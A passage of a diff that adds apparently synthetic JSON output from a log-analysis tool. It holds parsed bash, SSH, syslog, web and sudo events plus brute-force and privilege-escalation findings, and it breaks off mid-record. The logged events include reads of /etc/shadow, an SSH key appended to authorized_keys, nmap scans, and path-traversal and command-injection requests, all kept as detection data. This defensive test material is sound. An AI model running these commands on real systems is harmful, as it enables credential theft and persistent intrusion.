@@ -1,0 +1,3478 @@
+{
+    "events": [
+        {
+            "event_id": "BASH-00001",
+            "timestamp": "2025-10-11T15:41:24+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "whoami",
+            "severity": "INFO",
+            "raw": "whoami",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00002",
+            "timestamp": "2025-10-11T15:41:25+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "id",
+            "severity": "INFO",
+            "raw": "id",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00003",
+            "timestamp": "2025-10-11T15:41:26+00:00",
+            "source": "bash_history",
+            "event_type": "SUDO_COMMAND",
+            "message": "Command executed through sudo",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "sudo -i",
+            "severity": "HIGH",
+            "raw": "sudo -i",
+            "metadata": {
+                "shell": "bash",
+                "classification": "SUDO_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00004",
+            "timestamp": "2025-10-11T15:41:28+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/passwd",
+            "severity": "HIGH",
+            "raw": "cat /etc/passwd",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00005",
+            "timestamp": "2025-10-11T15:41:30+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/shadow",
+            "severity": "HIGH",
+            "raw": "cat /etc/shadow",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00006",
+            "timestamp": "2025-10-11T15:41:32+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "ss -tulnp",
+            "severity": "MEDIUM",
+            "raw": "ss -tulnp",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00007",
+            "timestamp": "2025-10-11T15:41:34+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "severity": "MEDIUM",
+            "raw": "nmap -sV 192.0.2.0/24",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00008",
+            "timestamp": "2025-10-11T15:41:37+00:00",
+            "source": "bash_history",
+            "event_type": "DOWNLOAD",
+            "message": "Potential remote file download",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "curl -O https://example.invalid/update.bin",
+            "severity": "MEDIUM",
+            "raw": "curl -O https://example.invalid/update.bin",
+            "metadata": {
+                "shell": "bash",
+                "classification": "DOWNLOAD"
+            }
+        },
+        {
+            "event_id": "BASH-00009",
+            "timestamp": "2025-10-11T15:41:40+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "severity": "HIGH",
+            "raw": "echo \"ssh-rsa EXAMPLE_PUBLIC_KEY\" >> ~/.ssh/authorized_keys",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00010",
+            "timestamp": "2025-10-11T15:41:44+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "systemctl status suspicious-monitor.service",
+            "severity": "INFO",
+            "raw": "systemctl status suspicious-monitor.service",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00001",
+            "timestamp": "2026-10-06T15:41:05+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_STARTED",
+            "message": "System service started",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:05 server systemd[1]: Started OpenSSH server daemon.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_STARTED",
+                "service": "OpenSSH server daemon"
+            }
+        },
+        {
+            "event_id": "SSH-00001",
+            "timestamp": "2026-10-06T15:41:08+00:00",
+            "source": "ssh",
+            "event_type": "SSH_CONNECTION",
+            "message": "SSH connection established",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:08 server sshd[2201]: Connection from 192.0.2.50 port 42110 on 192.0.2.10 port 22",
+            "metadata": {
+                "connection_state": "accepted"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00002",
+            "timestamp": "2026-10-06T15:41:08+00:00",
+            "source": "syslog",
+            "event_type": "KERNEL_EVENT",
+            "message": "Kernel-generated system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:08 server kernel: Network interface event detected.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "KERNEL_EVENT"
+            }
+        },
+        {
+            "event_id": "WEB-00001",
+            "timestamp": "2026-10-06T15:41:10+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:10 +0000] \"GET / HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 1024,
+                "referer": "-",
+                "user_agent": "Mozilla/5.0",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00002",
+            "timestamp": "2026-10-06T15:41:11+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:11 +0000] \"GET /login HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/login",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 2048,
+                "referer": "-",
+                "user_agent": "Mozilla/5.0",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "SSH-00002",
+            "timestamp": "2026-10-06T15:41:12+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:41:12 server sshd[2201]: Failed password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "SYSLOG-00003",
+            "timestamp": "2026-10-06T15:41:12+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_FAILURE",
+            "message": "System service reported a failure",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "Oct  6 15:41:12 server sshd[2201]: Authentication failure threshold reached.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_FAILURE"
+            }
+        },
+        {
+            "event_id": "SSH-00003",
+            "timestamp": "2026-10-06T15:41:15+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:41:15 server sshd[2201]: Failed password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "SSH-00004",
+            "timestamp": "2026-10-06T15:41:18+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:41:18 server sshd[2201]: Failed password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "WEB-00003",
+            "timestamp": "2026-10-06T15:41:20+00:00",
+            "source": "web_access",
+            "event_type": "WEB_PATH_TRAVERSAL",
+            "message": "Potential path traversal attempt",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:20 +0000] \"GET /../../etc/passwd HTTP/1.1\" 400 512 \"-\" \"curl/8.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/../../etc/passwd",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 400,
+                "response_size": 512,
+                "referer": "-",
+                "user_agent": "curl/8.0",
+                "classification": "WEB_PATH_TRAVERSAL"
+            }
+        },
+        {
+            "event_id": "SSH-00005",
+            "timestamp": "2026-10-06T15:41:21+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:21 server sshd[2201]: Accepted password for admin from 192.0.2.50 port 42110 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "success",
+                "port": 42110
+            }
+        },
+        {
+            "event_id": "SSH-00006",
+            "timestamp": "2026-10-06T15:41:21+00:00",
+            "source": "ssh",
+            "event_type": "SSH_SESSION_OPEN",
+            "message": "SSH session opened",
+            "user": "admin(uid=1000)",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:21 server sshd[2201]: pam_unix(sshd:session): session opened for user admin(uid=1000) by (uid=0)",
+            "metadata": {
+                "session_state": "opened"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00004",
+            "timestamp": "2026-10-06T15:41:21+00:00",
+            "source": "syslog",
+            "event_type": "AUTHENTICATION_EVENT",
+            "message": "Authentication-related system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:21 server sshd[2201]: Accepted password authentication for admin.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "AUTHENTICATION_EVENT"
+            }
+        },
+        {
+            "event_id": "SSH-00007",
+            "timestamp": "2026-10-06T15:41:22+00:00",
+            "source": "ssh",
+            "event_type": "SSH_DISCONNECT",
+            "message": "SSH connection disconnected",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:22 server sshd[2201]: Received disconnect from 192.0.2.50 port 42110:11: disconnected by user",
+            "metadata": {
+                "connection_state": "closed"
+            }
+        },
+        {
+            "event_id": "WEB-00004",
+            "timestamp": "2026-10-06T15:41:23+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SCANNER",
+            "message": "Request contains a known security scanning tool identifier",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:23 +0000] \"GET /admin HTTP/1.1\" 404 256 \"-\" \"Nmap Scripting Engine\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/admin",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 404,
+                "response_size": 256,
+                "referer": "-",
+                "user_agent": "Nmap Scripting Engine",
+                "classification": "WEB_SCANNER"
+            }
+        },
+        {
+            "event_id": "SUDO-00001",
+            "timestamp": "2026-10-06T15:41:24+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/id",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:24 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/id",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00005",
+            "timestamp": "2026-10-06T15:41:24+00:00",
+            "source": "syslog",
+            "event_type": "SYSLOG_EVENT",
+            "message": "General Linux system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:24 server sudo[2230]: admin executed privileged command.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SYSLOG_EVENT"
+            }
+        },
+        {
+            "event_id": "WEB-00005",
+            "timestamp": "2026-10-06T15:41:25+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SENSITIVE_FILE",
+            "message": "Request targeted a potentially sensitive file",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:25 +0000] \"GET /etc/shadow HTTP/1.1\" 404 256 \"-\" \"curl/8.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/etc/shadow",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 404,
+                "response_size": 256,
+                "referer": "-",
+                "user_agent": "curl/8.0",
+                "classification": "WEB_SENSITIVE_FILE"
+            }
+        },
+        {
+            "event_id": "SUDO-00002",
+            "timestamp": "2026-10-06T15:41:26+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/cat /etc/shadow",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:26 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00006",
+            "timestamp": "2026-10-06T15:41:26+00:00",
+            "source": "syslog",
+            "event_type": "KERNEL_EVENT",
+            "message": "Kernel-generated system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:26 server kernel: Audit event recorded for sensitive file access.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "KERNEL_EVENT"
+            }
+        },
+        {
+            "event_id": "WEB-00006",
+            "timestamp": "2026-10-06T15:41:27+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SCANNER",
+            "message": "Request contains a known security scanning tool identifier",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:27 +0000] \"GET /cgi-bin/test?cmd=id HTTP/1.1\" 200 4096 \"-\" \"sqlmap/1.8\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/cgi-bin/test?cmd=id",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 4096,
+                "referer": "-",
+                "user_agent": "sqlmap/1.8",
+                "classification": "WEB_SCANNER"
+            }
+        },
+        {
+            "event_id": "SUDO-00003",
+            "timestamp": "2026-10-06T15:41:29+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/apt-get update",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:29 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt-get update",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00007",
+            "timestamp": "2026-10-06T15:41:30+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_STARTED",
+            "message": "System service started",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:30 server systemd[1]: Started suspicious-monitor.service.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_STARTED",
+                "service": "suspicious-monitor"
+            }
+        },
+        {
+            "event_id": "WEB-00007",
+            "timestamp": "2026-10-06T15:41:31+00:00",
+            "source": "web_access",
+            "event_type": "WEB_SENSITIVE_FILE",
+            "message": "Request targeted a potentially sensitive file",
+            "user": null,
+            "source_ip": "192.0.2.50",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "192.0.2.50 - - [06/Oct/2026:15:41:31 +0000] \"GET /?cmd=%3Bcat%20/etc/passwd HTTP/1.1\" 200 4096 \"-\" \"Mozilla/5.0\"",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/?cmd=%3Bcat%20/etc/passwd",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 4096,
+                "referer": "-",
+                "user_agent": "Mozilla/5.0",
+                "classification": "WEB_SENSITIVE_FILE"
+            }
+        },
+        {
+            "event_id": "SUDO-00004",
+            "timestamp": "2026-10-06T15:41:32+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/systemctl status ssh",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:41:32 server sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status ssh",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "admin->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00008",
+            "timestamp": "2026-10-06T15:41:35+00:00",
+            "source": "syslog",
+            "event_type": "NETWORK_EVENT",
+            "message": "System network activity detected",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:41:35 server systemd[1]: Network connection established.",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "NETWORK_EVENT"
+            }
+        },
+        {
+            "event_id": "AUTH-00001",
+            "timestamp": "2026-10-06T22:14:03+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:03 detective sshd[1201]: Failed password for admin from 192.0.2.50 port 42112 ssh2",
+            "metadata": {
+                "port": 42112,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00002",
+            "timestamp": "2026-10-06T22:14:07+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:07 detective sshd[1203]: Failed password for admin from 192.0.2.50 port 42115 ssh2",
+            "metadata": {
+                "port": 42115,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00003",
+            "timestamp": "2026-10-06T22:14:11+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:11 detective sshd[1205]: Failed password for admin from 192.0.2.50 port 42118 ssh2",
+            "metadata": {
+                "port": 42118,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00004",
+            "timestamp": "2026-10-06T22:14:15+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct 06 22:14:15 detective sshd[1207]: Failed password for admin from 192.0.2.50 port 42121 ssh2",
+            "metadata": {
+                "port": 42121,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "AUTH-00005",
+            "timestamp": "2026-10-06T22:15:01+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "admin",
+            "source_ip": "192.0.2.50",
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct 06 22:15:01 detective sshd[1210]: Accepted password for admin from 192.0.2.50 port 42125 ssh2",
+            "metadata": {
+                "port": 42125,
+                "authentication": "password",
+                "result": "success"
+            }
+        },
+        {
+            "event_id": "AUTH-00006",
+            "timestamp": "2026-10-06T22:15:02+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_SESSION_OPEN",
+            "message": "SSH session opened",
+            "user": "admin",
+            "source_ip": null,
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct 06 22:15:02 detective sshd[1210]: pam_unix(sshd:session): session opened for user admin",
+            "metadata": {
+                "session_state": "opened"
+            }
+        },
+        {
+            "event_id": "AUTH-00007",
+            "timestamp": "2026-10-06T22:16:14+00:00",
+            "source": "auth.log",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "admin",
+            "source_ip": null,
+            "process": "22",
+            "pid": null,
+            "command": "/bin/bash",
+            "severity": "HIGH",
+            "raw": "Oct 06 22:16:14 detective sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "target_user": "root",
+                "privilege_change": true
+            }
+        },
+        {
+            "event_id": "AUTH-00008",
+            "timestamp": "2026-10-06T22:17:32+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_SESSION_CLOSE",
+            "message": "SSH session closed",
+            "user": "admin",
+            "source_ip": null,
+            "process": "22",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct 06 22:17:32 detective sshd[1210]: pam_unix(sshd:session): session closed for user admin",
+            "metadata": {
+                "session_state": "closed"
+            }
+        }
+    ],
+    "findings": [
+        {
+            "finding_id": "BRUTE-FORCE-0001",
+            "event_type": "SSH_BRUTE_FORCE",
+            "title": "SSH Brute-Force Activity Detected",
+            "description": "4 failed SSH authentication attempts were detected from 192.0.2.50 against user admin within 300 seconds.",
+            "severity": "HIGH",
+            "source_ip": "192.0.2.50",
+            "username": "admin",
+            "failed_attempts": 4,
+            "first_seen": "2026-10-06T22:14:03+00:00",
+            "last_seen": "2026-10-06T22:14:15+00:00",
+            "event_ids": [
+                "AUTH-00001",
+                "AUTH-00002",
+                "AUTH-00003",
+                "AUTH-00004"
+            ],
+            "metadata": {
+                "threshold": 4,
+                "window_seconds": 300,
+                "detection": "repeated_failed_ssh_authentication"
+            }
+        },
+        {
+            "finding_id": "BRUTE-FORCE-SUCCESS-0001",
+            "event_type": "SSH_BRUTE_FORCE_SUCCESS",
+            "title": "Successful SSH Login After Brute-Force Activity",
+            "description": "4 failed SSH authentication attempts from 192.0.2.50 against user admin were followed by a successful SSH authentication.",
+            "severity": "CRITICAL",
+            "source_ip": "192.0.2.50",
+            "username": "admin",
+            "failed_attempts": 4,
+            "first_failure": "2026-10-06T22:14:03+00:00",
+            "successful_login": "2026-10-06T22:15:01+00:00",
+            "session_opened": "2026-10-06T22:15:02+00:00",
+            "event_ids": [
+                "AUTH-00001",
+                "AUTH-00002",
+                "AUTH-00003",
+                "AUTH-00004",
+                "AUTH-00005",
+                "AUTH-00006"
+            ],
+            "metadata": {
+                "threshold": 4,
+                "window_seconds": 300,
+                "detection": "successful_login_after_repeated_failed_ssh_authentication",
+                "session_detected": true
+            }
+        },
+        {
+            "finding_id": "PRIV-ESC-0001",
+            "event_type": "PRIVILEGE_ESCALATION",
+            "title": "Potential Privilege Escalation Detected",
+            "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+            "severity": "CRITICAL",
+            "username": "admin",
+            "target_user": "root",
+            "command": "/usr/bin/id",
+            "source_ip": null,
+            "event_id": "SUDO-00001",
+            "timestamp": "2026-10-06T15:41:24+00:00",
+            "indicators": [
+                "sudo",
+                "target_user=root"
+            ],
+            "metadata": {
+                "detection": "sudo_privilege_transition",
+                "original_event_type": "SUDO_COMMAND",
+                "source": "sudo",
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "privilege_change": true,
+                "root_target": true
+            }
+        },
+        {
+            "finding_id": "PRIV-ESC-0002",
+            "event_type": "PRIVILEGE_ESCALATION",
+            "title": "Potential Privilege Escalation Detected",
+            "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+            "severity": "CRITICAL",
+            "username": "admin",
+            "target_user": "root",
+            "command": "/usr/bin/cat /etc/shadow",
+            "source_ip": null,
+            "event_id": "SUDO-00002",
+            "timestamp": "2026-10-06T15:41:26+00:00",
+            "indicators": [
+                "sudo",
+                "target_user=root"
+            ],
+            "metadata": {
+                "detection": "sudo_privilege_transition",
+                "original_event_type": "SUDO_COMMAND",
+                "source": "sudo",
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "privilege_change": true,
+                "root_target": true
+            }
+        },
+        {
+            "finding_id": "PRIV-ESC-0003",
+            "event_type": "PRIVILEGE_ESCALATION",
+            "title": "Potential Privilege Escalation Detected",
+            "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+            "severity": "CRITICAL",
+            "username": "admin",
+            "target_user": "root",
+            "command": "/usr/bin/apt-get update",
+            "source_ip": null,
+            "event_id": "SUDO-00003",
+            "timestamp": "2026-10-06T15:41:29+00:00",
+            "indicators": [
+                "sudo",
+                "target_user=root"
+            ],
+            "metadata": {
+                "detection": "sudo_privilege_transition",
+                "original_event_type": "SUDO_COMMAND",
+                "source": "sudo",
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "privilege_change": true,
+                "root_target": true
+            }
+        },
+        {
+            "finding_id": "PRIV-ESC-0004",
+            "event_type": "PRIVILEGE_ESCALATION",
+            "title": "Potential Privilege Escalation Detected",
+            "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+            "severity": "CRITICAL",
+            "username": "admin",
+            "target_user": "root",
+            "command": "/usr/bin/systemctl status ssh",
+            "source_ip": null,
+            "event_id": "SUDO-00004",
+            "timestamp": "2026-10-06T15:41:32+00:00",
+            "indicators": [
+                "sudo",
+                "target_user=root"
+            ],
+            "metadata": {
+                "detection": "sudo_privilege_transition",
+                "original_event_type": "SUDO_COMMAND",
+                "source": "sudo",
+                "tty": "pts/0",
+                "pwd": "/home/admin",
+                "privilege_change": true,
+                "root_target": true
+            }
+        },
+        {
+            "finding_id": "PRIV-ESC-0005",
+            "event_type": "PRIVILEGE_ESCALATION",
+            "title": "Potential Privilege Escalation Detected",
+            "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+            "severity": "CRITICAL",
+            "username": "admin",
+            "target_user": "root",
+            "command": "/bin/bash",
+            "source_ip": null,
+            "event_id": "AUTH-00007",
+            "timestamp": "2026-10-06T22:16:14+00:00",
+            "indicators": [
+                "sudo",
+                "target_user=root"
+            ],
+            "metadata": {
+                "detection": "sudo_privilege_transition",
+                "original_event_type": "SUDO_COMMAND",
+                "source": "auth.log",
